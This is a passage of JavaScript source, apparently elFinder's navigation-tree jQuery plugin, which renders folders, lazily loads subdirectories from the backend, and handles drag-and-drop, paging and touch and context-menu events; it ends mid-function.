/**
 * @class  elFinder folders tree
 *
 * @author Dmitry (dio) Levashov
 **/
 jQuery.fn.elfindertree = function(fm, opts) {
	"use strict";
	var treeclass = fm.res('class', 'tree');
	
	this.not('.'+treeclass).each(function() {

		var c = 'class', mobile = fm.UA.Mobile,
			
			/**
			 * Root directory class name
			 *
			 * @type String
			 */
			root      = fm.res(c, 'treeroot'),

			/**
			 * Open root dir if not opened yet
			 *
			 * @type Boolean
			 */
			openRoot  = opts.openRootOnLoad,

			/**
			 * Open current work dir if not opened yet
			 *
			 * @type Boolean
			 */
			openCwd   = opts.openCwdOnOpen,

			
			/**
			 * Auto loading current directory parents and do expand their node
			 *
			 * @type Boolean
			 */
			syncTree  = openCwd || opts.syncTree,
			
			/**
			 * Subtree class name
			 *
			 * @type String
			 */
			subtree   = fm.res(c, 'navsubtree'),
			
			/**
			 * Directory class name
			 *
			 * @type String
			 */
			navdir    = fm.res(c, 'treedir'),
			
			/**
			 * Directory CSS selector
			 *
			 * @type String
			 */
			selNavdir = 'span.' + navdir,
			
			/**
			 * Collapsed arrow class name
			 *
			 * @type String
			 */
			collapsed = fm.res(c, 'navcollapse'),
			
			/**
			 * Expanded arrow class name
			 *
			 * @type String
			 */
			expanded  = fm.res(c, 'navexpand'),
			
			/**
			 * Class name to mark arrow for directory with already loaded children
			 *
			 * @type String
			 */
			loaded    = 'elfinder-subtree-loaded',
			
			/**
			 * Class name to mark need subdirs request
			 *
			 * @type String
			 */
			chksubdir = 'elfinder-subtree-chksubdir',
			
			/**
			 * Arraw class name
			 *
			 * @type String
			 */
			arrow = fm.res(c, 'navarrow'),
			
			/**
			 * Current directory class name
			 *
			 * @type String
			 */
			active    = fm.res(c, 'active'),
			
			/**
			 * Droppable dirs dropover class
			 *
			 * @type String
			 */
			dropover = fm.res(c, 'adroppable'),
			
			/**
			 * Hover class name
			 *
			 * @type String
			 */
			hover    = fm.res(c, 'hover'),
			
			/**
			 * Disabled dir class name
			 *
			 * @type String
			 */
			disabled = fm.res(c, 'disabled'),
			
			/**
			 * Draggable dir class name
			 *
			 * @type String
			 */
			draggable = fm.res(c, 'draggable'),
			
			/**
			 * Droppable dir  class name
			 *
			 * @type String
			 */
			droppable = fm.res(c, 'droppable'),
			
			/**
			 * root wrapper class
			 * 
			 * @type String
			 */
			wrapperRoot = 'elfinder-navbar-wrapper-root',

			/**
			 * Un-disabled cmd `paste` volume's root wrapper class
			 * 
			 * @type String
			 */
			pastable = 'elfinder-navbar-wrapper-pastable',
			
			/**
			 * Un-disabled cmd `upload` volume's root wrapper class
			 * 
			 * @type String
			 */
			uploadable = 'elfinder-navbar-wrapper-uploadable',
			
			/**
			 * Is position x inside Navbar
			 * 
			 * @param x Numbar
			 * 
			 * @return
			 */
			insideNavbar = function(x) {
				var left = navbar.offset().left;
					
				return left <= x && x <= left + navbar.width();
			},
			
			/**
			 * To call subdirs elements queue
			 * 
			 * @type Object
			 */
			subdirsQue = {},
			
			/**
			 * To exec subdirs elements ids
			 * 
			 */
			subdirsExecQue = [],
			
			/**
			 * Request subdirs to backend
			 * 
			 * @param id String
			 * 
			 * @return Deferred
			 */
			subdirs = function(ids) {
				var targets = [];
				jQuery.each(ids, function(i, id) {
					subdirsQue[id] && targets.push(fm.navId2Hash(id));
					delete subdirsQue[id];
				});
				if (targets.length) {
					return fm.request({
						data: {
							cmd: 'subdirs',
							targets: targets,
							preventDefault : true
						}
					}).done(function(res) {
						if (res && res.subdirs) {
							jQuery.each(res.subdirs, function(hash, subdirs) {
								var elm = fm.navHash2Elm(hash);
								elm.removeClass(chksubdir);
								elm[subdirs? 'addClass' : 'removeClass'](collapsed);
							});
						}
					});
				}
			},
			
			subdirsJobRes = null,
			
			/**
			 * To check target element is in window of subdirs
			 * 
			 * @return void
			 */
			checkSubdirs = function() {
				var ids = Object.keys(subdirsQue);
				if (ids.length) {
					subdirsJobRes && subdirsJobRes._abort();
					execSubdirsTm && clearTimeout(execSubdirsTm);
					subdirsExecQue = [];
					subdirsJobRes = fm.asyncJob(function(id) {
						return fm.isInWindow(jQuery('#'+id))? id : null;
					}, ids, { numPerOnce: 200 })
					.done(function(arr) {
						if (arr.length) {
							subdirsExecQue = arr;
							execSubdirs();
						}
					});
				}
			},
			
			subdirsPending = 0,
			execSubdirsTm,
			
			/**
			 * Exec subdirs as batch request
			 * 
			 * @return void
			 */
			execSubdirs = function() {
				var cnt = opts.subdirsMaxConn - subdirsPending,
					atOnce = fm.maxTargets? Math.min(fm.maxTargets, opts.subdirsAtOnce) : opts.subdirsAtOnce,
					i, ids;
				execSubdirsTm && cancelAnimationFrame(execSubdirsTm);
				if (subdirsExecQue.length) {
					if (cnt > 0) {
						for (i = 0; i < cnt; i++) {
							if (subdirsExecQue.length) {
								subdirsPending++;
								subdirs(subdirsExecQue.splice(0, atOnce)).always(function() {
									subdirsPending--;
									execSubdirs();
								});
							}
						}
					} else {
						execSubdirsTm = requestAnimationFrame(function() {
							subdirsExecQue.length && execSubdirs();
						});
					}
				}
			},
			
			drop = fm.droppable.drop,
			
			/**
			 * Droppable options
			 *
			 * @type Object
			 */
			droppableopts = jQuery.extend(true, {}, fm.droppable, {
				// show subfolders on dropover
				over : function(e, ui) {
					var dst    = jQuery(this),
						helper = ui.helper,
						cl     = hover+' '+dropover,
						hash, status;
					e.stopPropagation();
					helper.data('dropover', helper.data('dropover') + 1);
					dst.data('dropover', true);
					if (ui.helper.data('namespace') !== fm.namespace || ! fm.insideWorkzone(e.pageX, e.pageY)) {
						dst.removeClass(cl);
						helper.removeClass('elfinder-drag-helper-move elfinder-drag-helper-plus');
						return;
					}
					if (! insideNavbar(e.clientX)) {
						dst.removeClass(cl);
						return;
					}
					helper.removeClass('elfinder-drag-helper-move elfinder-drag-helper-plus');
					dst.addClass(hover);
					if (dst.is('.'+collapsed+':not(.'+expanded+')')) {
						dst.data('expandTimer', setTimeout(function() {
							dst.is('.'+collapsed+'.'+hover) && dst.children('.'+arrow).trigger('click');
						}, 500));
					}
					if (dst.is('.elfinder-ro,.elfinder-na')) {
						dst.removeClass(dropover);
						//helper.removeClass('elfinder-drag-helper-move elfinder-drag-helper-plus');
						return;
					}
					hash = fm.navId2Hash(dst.attr('id'));
					dst.data('dropover', hash);
					jQuery.each(ui.helper.data('files'), function(i, h) {
						if (h === hash || (fm.file(h).phash === hash && !ui.helper.hasClass('elfinder-drag-helper-plus'))) {
							dst.removeClass(cl);
							return false; // break jQuery.each
						}
					});
					if (helper.data('locked')) {
						status = 'elfinder-drag-helper-plus';
					} else {
						status = 'elfinder-drag-helper-move';
						if (fm._commands.copy && (e.shiftKey || e.ctrlKey || e.metaKey)) {
							status += ' elfinder-drag-helper-plus';
						}
					}
					dst.hasClass(dropover) && helper.addClass(status);
					requestAnimationFrame(function(){ dst.hasClass(dropover) && helper.addClass(status); });
				},
				out : function(e, ui) {
					var dst    = jQuery(this),
						helper = ui.helper;
					e.stopPropagation();
					if (insideNavbar(e.clientX)) {
						helper.removeClass('elfinder-drag-helper-move elfinder-drag-helper-plus');
					}
					helper.data('dropover', Math.max(helper.data('dropover') - 1, 0));
					dst.data('expandTimer') && clearTimeout(dst.data('expandTimer'));
					dst.removeData('dropover')
					   .removeClass(hover+' '+dropover);
				},
				deactivate : function() {
					jQuery(this).removeData('dropover')
					       .removeClass(hover+' '+dropover);
				},
				drop : function(e, ui) {
					insideNavbar(e.clientX) && drop.call(this, e, ui);
				}
			}),
			
			spinner = jQuery(fm.res('tpl', 'navspinner')),
			
			/**
			 * Directory html template
			 *
			 * @type String
			 */
			tpl = fm.res('tpl', 'navdir'),
			
			/**
			 * Permissions marker html template
			 *
			 * @type String
			 */
			ptpl = fm.res('tpl', 'perms'),
			
			/**
			 * Lock marker html template
			 *
			 * @type String
			 */
			ltpl = fm.res('tpl', 'lock'),
			
			/**
			 * Symlink marker html template
			 *
			 * @type String
			 */
			stpl = fm.res('tpl', 'symlink'),
			
			/**
			 * Directory hashes that has more pages
			 * 
			 * @type Object
			 */
			hasMoreDirs = {},
			
			/**
			 * Html template replacement methods
			 *
			 * @type Object
			 */
			replace = {
				id          : function(dir) { return fm.navHash2Id(dir.hash); },
				name        : function(dir) { return fm.escape(dir.i18 || dir.name); },
				cssclass    : function(dir) {
					var cname = (dir.phash && ! dir.isroot ? '' : root)+' '+navdir+' '+fm.perms2class(dir);
					dir.dirs && !dir.link && (cname += ' ' + collapsed) && dir.dirs == -1 && (cname += ' ' + chksubdir);
					opts.getClass && (cname += ' ' + opts.getClass(dir));
					dir.csscls && (cname += ' ' + fm.escape(dir.csscls));
					return cname;
				},
				title       : function(dir) { return opts.attrTitle? (' title="' + fm.escape(fm.path(dir.hash, true) || dir.i18 || dir.name) + '"') : ''; },
				root        : function(dir) {
					var cls = '';
					if (!dir.phash || dir.isroot) {
						cls += ' '+wrapperRoot;
						if (!dir.disabled || dir.disabled.length < 1) {
							cls += ' '+pastable+' '+uploadable;
						} else {
							if (jQuery.inArray('paste', dir.disabled) === -1) {
								cls += ' '+pastable;
							}
							if (jQuery.inArray('upload', dir.disabled) === -1) {
								cls += ' '+uploadable;
							}
						}
						return cls;
					} else {
						return '';
					}
				},
				permissions : function(dir) { return !dir.read || !dir.write ? ptpl : ''; },
				symlink     : function(dir) { return dir.alias ? stpl : ''; },
				style       : function(dir) { return dir.icon ? fm.getIconStyle(dir) : ''; }
			},
			
			/**
			 * Return html for given dir
			 *
			 * @param  Object  directory
			 * @return String
			 */
			itemhtml = function(dir) {
				return tpl.replace(/(?:\{([a-z]+)\})/ig, function(m, key) {
					var res = replace[key] ? replace[key](dir) : (dir[key] || '');
					if (key === 'id' && dir.dirs == -1) {
						subdirsQue[res] = res;
					}
					return res;
				});
			},
			
			/**
			 * Return only dirs from files list
			 *
			 * @param  Array   files list
			 * @param  Boolean do check exists
			 * @return Array
			 */
			filter = function(files, checkExists) {
				return jQuery.map(files || [], function(f) {
					return (f.mime === 'directory' && (!checkExists || fm.navHash2Elm(f.hash).length)) ? f : null;
				});
			},
			
			/**
			 * Find parent subtree for required directory
			 *
			 * @param  String  dir hash
			 * @return jQuery
			 */
			findSubtree = function(hash) {
				return hash ? fm.navHash2Elm(hash).next('.'+subtree) : tree;
			},
			
			/**
			 * Find directory (wrapper) in required node
			 * before which we can insert new directory
			 *
			 * @param  jQuery  parent directory
			 * @param  Object  new directory
			 * @return jQuery
			 */
			findSibling = function(subtree, dir) {
				var node = subtree.children(':first'),
					info;

				while (node.length) {
					info = fm.file(fm.navId2Hash(node.children('[id]').attr('id')));
					
					if ((info = fm.file(fm.navId2Hash(node.children('[id]').attr('id')))) 
					&& compare(dir, info) < 0) {
						return node;
					}
					node = node.next();
				}
				return subtree.children('button.elfinder-navbar-pager-next');
			},
			
			/**
			 * Add new dirs in tree
			 *
			 * @param  Array  dirs list
			 * @return void
			 */
			updateTree = function(dirs) {
				var length  = dirs.length,
					orphans = [],
					i = length,
					tgts = jQuery(),
					done = {},
					cwd = fm.cwd(),
					append = function(parent, dirs, start, direction) {
						var hashes = {},
							curStart = 0,
							max = fm.newAPI? Math.min(10000, Math.max(10, opts.subTreeMax)) : 10000,
							setHashes = function() {
								hashes = {};
								jQuery.each(dirs, function(i, d) {
									hashes[d.hash] = i;
								});
							},
							change = function(mode) {
								if (mode === 'prepare') {
									jQuery.each(dirs, function(i, d) {
										d.node && parent.append(d.node.hide());
									});
								} else if (mode === 'done') {
									jQuery.each(dirs, function(i, d) {
										d.node && d.node.detach().show();
									});
								}
							},
							update = function(e, data) {
								var i, changed;
								e.stopPropagation();
								
								if (data.select) {
									render(getStart(data.select));
									return;
								}
								
								if (data.change) {
									change(data.change);
									return;
								}
								
								if (data.removed && data.removed.length) {
									dirs = jQuery.grep(dirs, function(d) {
										if (data.removed.indexOf(d.hash) === -1) {
											return true;
										} else {
											!changed && (changed = true);
											return false;
										}
									});
								}
								
								if (data.added && data.added.length) {
									dirs = dirs.concat(jQuery.grep(data.added, function(d) {
										if (hashes[d.hash] === void(0)) {
											!changed && (changed = true);
											return true;
										} else {
											return false;
										}
									}));
								}
								if (changed) {
									dirs.sort(compare);
									setHashes();
									render(curStart);
								}
							},
							getStart = function(target) {
								if (hashes[target] !== void(0)) {
									return Math.floor(hashes[target] / max) * max;
								}
								return void(0);
							},
							target = fm.navId2Hash(parent.prev('[id]').attr('id')),
							render = function(start, direction) {
								var html = [],
									nodes = {},
									total, page, s, parts, prev, next, prevBtn, nextBtn;
								delete hasMoreDirs[target];
								curStart = start;
								parent.off('update.'+fm.namespace, update);
								if (dirs.length > max) {
									parent.on('update.'+fm.namespace, update);
									if (start === void(0)) {
										s = 0;
										setHashes();
										start = getStart(cwd.hash);
										if (start === void(0)) {
											start = 0;
										}
									}
									parts = dirs.slice(start, start + max);
									hasMoreDirs[target] = parent;
									prev = start? Math.max(-1, start - max) : -1;
									next = (start + max >= dirs.length)? 0 : start + max;
									total = Math.ceil(dirs.length/max);
									page = Math.ceil(start/max);
								}
								jQuery.each(parts || dirs, function(i, d) {
									html.push(itemhtml(d));
									if (d.node) {
										nodes[d.hash] = d.node;
									}
								});
								if (prev > -1) {
									prevBtn = jQuery('<button class="elfinder-navbar-pager elfinder-navbar-pager-prev"></button>')
										.text(fm.i18n('btnPrevious', page, total))
										.button({
											icons: {
												primary: "ui-icon-caret-1-n"
											}
										})
										.on('click', function(e) {
											e.preventDefault();
											e.stopPropagation();
											render(prev, 'up');
										});
								} else {
									prevBtn = jQuery();
								}
								if (next) {
									nextBtn = jQuery('<button class="elfinder-navbar-pager elfinder-navbar-pager-next"></button>')
										.text(fm.i18n('btnNext', page + 2, total))
										.button({
											icons: {
												primary: "ui-icon-caret-1-s"
											}
										})
										.on('click', function(e) {
											e.preventDefault();
											e.stopPropagation();
											render(next, 'down');
										});
								} else {
									nextBtn = jQuery();
								}
								detach();
								parent.empty()[parts? 'addClass' : 'removeClass']('elfinder-navbar-hasmore').append(prevBtn, html.join(''), nextBtn);
								jQuery.each(nodes, function(h, n) {
									fm.navHash2Elm(h).parent().replaceWith(n);
								});
								if (direction) {
									autoScroll(fm.navHash2Id(parts[direction === 'up'? parts.length - 1 : 0].hash));
								}
								! mobile && fm.lazy(function() { updateDroppable(null, parent); });
							},
							detach = function() {
								jQuery.each(parent.children('.elfinder-navbar-wrapper'), function(i, elm) {
									var n = jQuery(elm),
										ch = n.children('[id]:first'),
										h, c;
									if (ch.hasClass(loaded)) {
										h = fm.navId2Hash(ch.attr('id'));
										if (h && (c = hashes[h]) !== void(0)) {
											dirs[c].node = n.detach();
										}
									}
								});
							};
						
						render();
					},
					dir, html, parent, sibling, init, atonce = {}, updates = [], base, node,
					lastKey, lastNodes = {};
				
				while (i--) {
					dir = dirs[i];

					if (done[dir.hash] || fm.navHash2Elm(dir.hash).length) {
						continue;
					}
					done[dir.hash] = true;
					
					if ((parent = findSubtree(dir.phash)).length) {
						lastKey = dir.phash || 'treeroot';
						if (typeof lastNodes[lastKey] === 'undefined') {
							lastNodes[lastKey] = parent.children(':last');
						}
						init = !lastNodes[lastKey].length;
						if (dir.phash && (init || parent.hasClass('elfinder-navbar-hasmore') || (sibling = findSibling(parent, dir)).length)) {
							if (init) {
								if (!atonce[dir.phash]) {
									atonce[dir.phash] = [];
								}
								atonce[dir.phash].push(dir);
							} else {
								if (sibling) {
									node = itemhtml(dir);
									sibling.before(node);
									! mobile && (tgts = tgts.add(node));
								} else {
									updates.push(dir);
								}
							}
						} else {
							node = itemhtml(dir);
							if (init) {
								parent.prepend(node);
							} else {
								lastNodes[lastKey].after(node);
							}
							if (!dir.phash || dir.isroot) {
								base = fm.navHash2Elm(dir.hash).parent();
							}
							! mobile && updateDroppable(null, base);
						}
					} else {
						orphans.push(dir);
					}
				}

				// When init, html append at once
				if (Object.keys(atonce).length){
					jQuery.each(atonce, function(p, dirs){
						var parent = findSubtree(p),
						    html   = [];
						dirs.sort(compare);
						append(parent, dirs);
					});
				}
				
				if (updates.length) {
					parent.trigger('update.' + fm.namespace, { added : updates });
				}
				
				if (orphans.length && orphans.length < length) {
					updateTree(orphans);
					return;
				} 
				
				! mobile && tgts.length && fm.lazy(function() { updateDroppable(tgts); });
				
			},
			
			/**
			 * sort function by dir.name
			 * 
			 */
			compare = function(dir1, dir2) {
				if (! fm.sortAlsoTreeview) {
					return fm.sortRules.name(dir1, dir2);
				} else {
					var asc   = fm.sortOrder == 'asc',
						type  = fm.sortType,
						rules = fm.sortRules,
						res;
					
					res = asc? rules[fm.sortType](dir1, dir2) : rules[fm.sortType](dir2, dir1);
					
					return type !== 'name' && res === 0
						? res = asc ? rules.name(dir1, dir2) : rules.name(dir2, dir1)
						: res;
				}
			},

			/**
			 * Timer ID of autoScroll
			 * 
			 * @type  Integer
			 */
			autoScrTm,

			/**
			 * Auto scroll to cwd
			 *
			 * @return Object  jQuery Deferred
			 */
			autoScroll = function(target) {
				var dfrd = jQuery.Deferred(),
					current, parent, top, treeH, bottom, tgtTop;
				autoScrTm && clearTimeout(autoScrTm);
				autoScrTm = setTimeout(function() {
					current = jQuery(document.getElementById((target || fm.navHash2Id(fm.cwd().hash))));
					if (current.length) {
						// expand parents directory
						(openCwd? current : current.parent()).parents('.elfinder-navbar-wrapper').children('.'+loaded).addClass(expanded).next('.'+subtree).show();
						
						parent = tree.parent().stop(false, true);
						top = parent.offset().top;
						treeH = parent.height();
						bottom = top + treeH - current.outerHeight();
						tgtTop = current.offset().top;
						
						if (tgtTop < top || tgtTop > bottom) {
							parent.animate({
								scrollTop : parent.scrollTop() + tgtTop - top - treeH / 3
							}, {
								duration : opts.durations.autoScroll,
								complete : function() {	dfrd.resolve(); }
							});
						} else {
							dfrd.resolve();
						}
					} else {
						dfrd.reject();
					}
				}, 100);
				return dfrd;
			},
			/**
			 * Get hashes array of items of the bottom of the leaf root back from the target
			 * 
			 * @param Object elFinder item(directory) object
			 * @return Array hashes
			 */
			getEnds = function(d) {
				var cur = d || fm.cwd(),
					res = cur.hash? [ cur.hash ] : [],
					phash, root, dir;
				
				root = fm.root(cur.hash);
				dir = fm.file(root);
				while (dir && (phash = dir.phash)) {
					res.unshift(phash);
					root = fm.root(phash);
					dir = fm.file(root);
					if (fm.navHash2Elm(dir.hash).hasClass(loaded)) {
						break;
					}
				}
				
				return res;
			},
			
			/**
			 * Select pages back in order to display the target
			 * 
			 * @param Object elFinder item(directory) object
			 * @return Object jQuery node object of target node
			 */
			selectPages = function(current) {
				var cur = current || fm.cwd(),
					curHash = cur.hash,
					node = fm.navHash2Elm(curHash);
			
				if (!node.length) {
					while(cur && cur.phash) {
						if (hasMoreDirs[cur.phash] && !fm.navHash2Elm(cur.hash).length) {
							hasMoreDirs[cur.phash].trigger('update.'+fm.namespace, { select : cur.hash });
						}
						cur = fm.file(cur.phash);
					}
					node = fm.navHash2Elm(curHash);
				}
				
				return node;
			},
			
			/**
			 * Flag indicating that synchronization is currently in progress
			 * 
			 * @type Boolean
			 */
			syncing,

			/**
			 * Mark current directory as active
			 * If current directory is not in tree - load it and its parents
			 *
			 * @param Array directory objects of cwd
			 * @param Boolean do auto scroll
			 * @return Object jQuery Deferred
			 */
			sync = function(cwdDirs, aScr) {
				var cwd     = fm.cwd(),
					cwdhash = cwd.hash,
					autoScr = aScr === void(0)? syncTree : aScr,
					loadParents = function(dir) {
						var dfd  = jQuery.Deferred(),
							reqs = [],
							ends = getEnds(dir),
							makeReq = function(cmd, h, until) {
								var data = {
										cmd    : cmd,
										target : h
									};
								if (until) {
									data.until = until;
								}
								return fm.request({
									data : data,
									preventFail : true
								});
							},
							baseHash, baseId;
						
						reqs = jQuery.map(ends, function(h) {
							var d = fm.file(h),
								isRoot = d? fm.isRoot(d) : false,
								node = fm.navHash2Elm(h),
								getPhash = function(h, dep) {
									var d, ph,
										depth = dep || 1;
									ph = (d = fm.file(h))? d.phash : false;
									if (ph && depth > 1) {
										return getPhash(ph, --depth);
									}
									return ph;
								},
								until,
								closest = (function() {
									var phash = getPhash(h);
									until = phash;
									while (phash) {
										if (fm.navHash2Elm(phash).hasClass(loaded)) {
											break;
										}
										until = phash;
										phash = getPhash(phash);
									}
									if (!phash) {
										until = void(0);
										phash = fm.root(h);
									}
									return phash;
								})(),
								cmd;
							
							if (!node.hasClass(loaded) && (isRoot || !d || !fm.navHash2Elm(d.phash).hasClass(loaded))) {
								if (isRoot || closest === getPhash(h) || closest === getPhash(h, 2)) {
									until = void(0);
									cmd = 'tree';
									if (!isRoot) {
										h = getPhash(h);
									}
								} else {
									cmd = 'parents';
								}
								if (!baseHash) {
									baseHash = (cmd === 'tree')? h : closest;
								}
								return makeReq(cmd, h, until);
							}
							return null;
						});
						
						if (reqs.length) {
							selectPages(fm.file(baseHash));
							baseId = fm.navHash2Id(baseHash);
							autoScr && autoScroll(baseId);
							baseNode = jQuery('#'+baseId);
							spinner = jQuery(fm.res('tpl', 'navspinner')).insertBefore(baseNode.children('.'+arrow));
							baseNode.removeClass(collapsed);
							
							jQuery.when.apply($, reqs)
							.done(function() {
								var res = {},data, treeDirs, dirs, argLen, i;
								argLen = arguments.length;
								if (argLen > 0) {
									for (i = 0; i < argLen; i++) {
										data = arguments[i].tree || [];
										res[ends[i]] = Object.assign([], filter(data));
									}
								}
								dfd.resolve(res);
							})
							.fail(function() {
								dfd.reject();
							});
							
							return dfd;
						} else {
							return dfd.resolve();
						}
					},
					done= function(res, dfrd) {
						var open = function() {
								if (openRoot && baseNode) {
									findSubtree(baseNode.hash).show().prev(selNavdir).addClass(expanded);
									openRoot = false;
								}
								if (autoScr) {
									autoScroll().done(checkSubdirs);
								} else {
									checkSubdirs();
								}
							},
							current;
						
						if (res) {
							jQuery.each(res, function(endHash, dirs) {
								dirs && updateTree(dirs);
								selectPages(fm.file(endHash));
								dirs && updateArrows(dirs, loaded);
							});
						}
						
						if (cwdDirs) {
							(fm.api < 2.1) && cwdDirs.push(cwd);
							updateTree(cwdDirs);
						}
						
						// set current node
						current = selectPages();
						
						if (!current.hasClass(active)) {
							tree.find(selNavdir+'.'+active).removeClass(active);
							current.addClass(active);
						}
						
						// mark as loaded to cwd parents
						current.parents('.elfinder-navbar-wrapper').children('.'+navdir).addClass(loaded);
						
						if (res) {
							fm.lazy(open).done(function() {
								dfrd.resolve();
							});
						} else {
							open();
							dfrd.resolve();
						}
					},
					rmSpinner = function(fail) {
						if (baseNode) {
							spinner.remove();
							baseNode.addClass(collapsed + (fail? '' : (' ' + loaded)));
						}
					},
					dfrd = jQuery.Deferred(),
					baseNode, spinner;
				
				if (!fm.navHash2Elm(cwdhash).length) {
					syncing = true;
					loadParents()
					.done(function(res) {
						done(res, dfrd);
						rmSpinner();
					})
					.fail(function() { 
						rmSpinner(true);
						dfrd.reject();
					})
					.always(function() {
						syncing = false;
					});
				} else {
					done(void(0), dfrd);
				}
				
				// trigger 'treesync' with my jQuery.Deferred
				fm.trigger('treesync', dfrd);

				return dfrd;
			},
			
			/**
			 * Make writable and not root dirs droppable
			 *
			 * @return void
			 */
			updateDroppable = function(target, node) {
				var limit = 100,
					next;
				
				if (!target) {
					if (!node || node.closest('div.'+wrapperRoot).hasClass(uploadable)) {
						(node || tree.find('div.'+uploadable)).find(selNavdir+':not(.elfinder-ro,.elfinder-na)').addClass('native-droppable');
					}
					if (!node || node.closest('div.'+wrapperRoot).hasClass(pastable)) {
						target = (node || tree.find('div.'+pastable)).find(selNavdir+':not(.'+droppable+')');
					} else {
						target = jQuery();
					}
					if (node) {
						// check leaf roots
						node.children('div.'+wrapperRoot).each(function() {
							updateDroppable(null, jQuery(this));
						});
					}
				}
				
				// make droppable on async
				if (target.length) {
					fm.asyncJob(function(elm) {
						jQuery(elm).droppable(droppableopts);
					}, jQuery.makeArray(target), {
						interval : 20,
						numPerOnce : 100
					});
				}
			},
			
			/**
			 * Check required folders for subfolders and update arrow classes
			 *
			 * @param  Array  folders to check
			 * @param  String css class 
			 * @return void
			 */
			updateArrows = function(dirs, cls) {
				var sel = cls == loaded
						? '.'+collapsed+':not(.'+loaded+')'
						: ':not(.'+collapsed+')';
				
				jQuery.each(dirs, function(i, dir) {
					fm.navHash2Elm(dir.phash).filter(sel)
						.filter(function() { return jQuery.grep(jQuery(this).next('.'+subtree).children(), function(n) {
							return (jQuery(n).children().hasClass(root))? false : true;
						}).length > 0; })
						.addClass(cls);
				});
			},
			
			
			
			/**
			 * Navigation tree
			 *
			 * @type JQuery
			 */
			tree = jQuery(this).addClass(treeclass)
				// make dirs draggable and toggle hover class
				.on('mouseenter mouseleave', selNavdir, function(e) {
					var enter = (e.type === 'mouseenter');
					if (enter && scrolling) { return; }
					var link  = jQuery(this),
						hash, dir; 
					
					if (!link.hasClass(dropover+' '+disabled)) {
						if (!mobile && enter && !link.data('dragRegisted') && !link.hasClass(root+' '+draggable+' elfinder-na elfinder-wo')) {
							link.data('dragRegisted', true);
							if (fm.isCommandEnabled('copy', (hash = fm.navId2Hash(link.attr('id'))))) {
								link.draggable(fm.draggable);
							}
						}
						link.toggleClass(hover, enter);
					}
					// update title attr if necessary
					if (enter && opts.attrTitle) {
						dir = fm.file(hash || fm.navId2Hash(link.attr('id')));
						if (!dir.isroot && link.attr('title') === (dir.i18 || dir.name)) {
							link.attr('title', fm.path(hash, true));
						}
					}
				})
				// native drag enter
				.on('dragenter', selNavdir, function(e) {
					if (e.originalEvent.dataTransfer) {
						var dst = jQuery(this);
						dst.addClass(hover);
						if (dst.is('.'+collapsed+':not(.'+expanded+')')) {
							dst.data('expandTimer', setTimeout(function() {
								dst.is('.'+collapsed+'.'+hover) && dst.children('.'+arrow).trigger('click');
							}, 500));
						}
					}
				})
				// native drag leave
				.on('dragleave', selNavdir, function(e) {
					if (e.originalEvent.dataTransfer) {
						var dst = jQuery(this);
						dst.data('expandTimer') && clearTimeout(dst.data('expandTimer'));
						dst.removeClass(hover);
					}
				})
				// open dir or open subfolders in tree
				.on('click', selNavdir, function(e) {
					var link = jQuery(this),
						hash = fm.navId2Hash(link.attr('id')),
						file = fm.file(hash);
					
					if (link.data('longtap')) {
						link.removeData('longtap');
						e.stopPropagation();
						return;
					}
					
					if (!link.hasClass(active)) {
						tree.find(selNavdir+'.'+active).removeClass(active);
						link.addClass(active);
					}
					if (hash != fm.cwd().hash && !link.hasClass(disabled)) {
						fm.exec('open', hash).done(function() {
							fm.one('opendone', function() {
								fm.select({selected: [hash], origin: 'navbar'});
							});
						});
					} else {
						if (link.hasClass(collapsed)) {
							link.children('.'+arrow).trigger('click');
						}
						fm.select({selected: [hash], origin: 'navbar'});
					}
				})
				// for touch device
				.on('touchstart', selNavdir, function(e) {
					if (e.originalEvent.touches.length > 1) {
						return;
					}
					var evt = e.originalEvent,
						p;
					
					if (e.target.nodeName === 'INPUT') {
						e.stopPropagation();
						return;
					}
					
					p = jQuery(this).addClass(hover)
					.removeData('longtap')
					.data('tmlongtap', setTimeout(function(e){
						// long tap
						p.data('longtap', true);
						fm.trigger('contextmenu', {
							'type'    : 'navbar',
							'targets' : [fm.navId2Hash(p.attr('id'))],
							'x'       : evt.touches[0].pageX,
							'y'       : evt.touches[0].pageY
						});
					}, 500));
				})
				.on('touchmove touchend', selNavdir, function(e) {
					if (e.target.nodeName === 'INPUT') {
						e.stopPropagation();
						return;
					}
					clearTimeout(jQuery(this).data('tmlongtap'));
					jQuery(this).removeData('tmlongtap');
					if (e.type == 'touchmove') {
						jQuery(this).removeClass(hover);
					}
				})
				// toggle subfolders in tree
				.on('click', selNavdir+'.'+collapsed+' .'+arrow, function(e) {
					var arrow = jQuery(this),
						link  = arrow.parent(selNavdir),
						stree = link.next('.'+subtree),
						dfrd  = jQuery.Deferred(),
						slideTH = 30, cnt;

					e.stopPropagation();

					if (link.hasClass(loaded)) {
						link.toggleClass(expanded);
						fm.lazy(function() {
							cnt = link.hasClass(expanded)? stree.children().length + stree.find('div.elfinder-navbar-subtree[style*=block]').children().length : stree.find('div:visible').length;
							if (cnt > slideTH) {
								stree.toggle();
								fm.draggingUiHelper && fm.draggingUiHelper.data('refreshPositions', 1);
								checkSubdirs();
							} else {
								stree.stop(true, true)[link.hasClass(expanded)? 'slideDown' : 'slideUp'](opts.durations.slideUpDown, function(){
									fm.draggingUiHelper && fm.draggingUiHelper.data('refreshPositions', 1);
									checkSubdirs();
								});
							}
						}).always(function() {
							dfrd.resolve();
						});
					} else {
						spinner.insertBefore(arrow);
						link.removeClass(collapsed);

						fm.request({cmd : 'tree', target : fm.navId2Hash(link.attr('id'))})
							.done(function(data) { 
								updateTree(Object.assign([], filter(data.tree))); 
								
								if (stree.children().length) {
									link.addClass(collapsed+' '+expanded);
									if (stree.children().length > slideTH) {
										stree.show();
										fm.draggingUiHelper && fm.draggingUiHelper.data('refreshPositions', 1);
										checkSubdirs();
									} else {
										stree.stop(true, true).slideDown(opts.durations.slideUpDown, function(){
											fm.draggingUiHelper && fm.draggingUiHelper.data('refreshPositions', 1);
											checkSubdirs();
										});
									}
								} 
							})
							.always(function(data) {
								spinner.remove();
								link.addClass(loaded);
								fm.one('treedone', function() {
									dfrd.resolve();
								});
							});
					}
					arrow.data('dfrd', dfrd);
				})
				.on('contextmenu', selNavdir, function(e) {
					e.stopPropagation();
					var self = jQuery(this);
					
					// now dirname editing
					if (self.find('input:text').length) {
						return;
					}
					
					e.preventDefault();

					if (!self.data('tmlongtap')) {
						fm.trigger('contextmenu', {
							'type'    : 'navbar',
							'targets' : [fm.navId2Hash(jQuery(this).attr('id'))],
							'x'       : e.pageX,
							'y'       : e.pageY
						});
					}
					self.addClass('ui-state-hover');
					
					fm.getUI('contextmenu').children().on('mouseenter', function() {
						self.addClass('ui-state-hover');
					});
					
					fm.bind('closecontextmenu', function() {
